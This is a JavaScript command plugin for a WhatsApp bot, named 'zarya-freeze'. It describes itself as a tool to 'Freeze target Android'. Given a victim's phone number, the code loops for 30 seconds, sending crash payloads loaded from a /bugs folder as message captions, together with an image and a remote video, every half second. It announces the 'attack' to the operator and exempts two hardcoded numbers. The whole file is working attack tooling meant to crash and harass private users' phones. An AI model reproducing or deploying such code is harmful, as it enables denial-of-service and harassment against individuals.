const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'zarya-freeze',
  desc: 'Freeze target Android using payloads from /bugs',
  category: 'bug',
  react: '❄️',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX || '.';

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'zarya-freeze') return;

    // ✅ Refuse nan gwoup
    if (m.isGroup) {
      return await bot.sendMessage(from, {
        text: '❌ This command is for private chat only.',
      }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}zarya-freeze <number>`
      }, { quoted: mek });
    }

    const blockedNumbers = ['13058962443', '50942241547'];
    if (blockedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. You cannot freeze it.',
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, { text: '📁 No payloads found in /bugs folder.' }, { quoted: mek });
    }

    // ✅ Alerte kòmansman
    await bot.sendMessage(from, {
      text: `🚀 *ZARYA-FREEZE Launched!*\n🎯 Target: +${targetNumber}\n📦 Payloads: ${bugFiles.length}\n🕒 Duration: 30s`,
    }, { quoted: mek });

    const endTime = Date.now() + 30000; // 30 sec

    async function sendFreeze(msg) {
      await bot.sendMessage(targetJid, {
        image: { url: path.resolve(__dirname, '../media/1.png') },
        caption: msg,
      });

      await bot.sendMessage(targetJid, {
        video: { url: 'https://files.catbox.moe/8e7mkq.mp4' },
        caption: '🔥 _ZARYA-FREEZE ATTACK IN PROGRESS_ 🔥',
      });
    }

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          delete require.cache[require.resolve(payloadPath)];
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'function') {
            const result = await bugPayload(m, bot);
            if (Array.isArray(result)) {
              for (const line of result) {
                await sendFreeze(`❄️ ${line}\n_BY ZARYA FREEZE_`);
                await new Promise(res => setTimeout(res, 500));
              }
            } else if (typeof result === 'string') {
              await sendFreeze(`❄️ ${result}\n_BY ZARYA FREEZE_`);
              await new Promise(res => setTimeout(res, 500));
            }
          }
        } catch (err) {
          console.error(`❌ Error in ${file}:`, err.message);
        }
      }
    }

    await bot.sendMessage(from, {
      text: `✅ *ZARYA-FREEZE complete* on +${targetNumber}`,
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});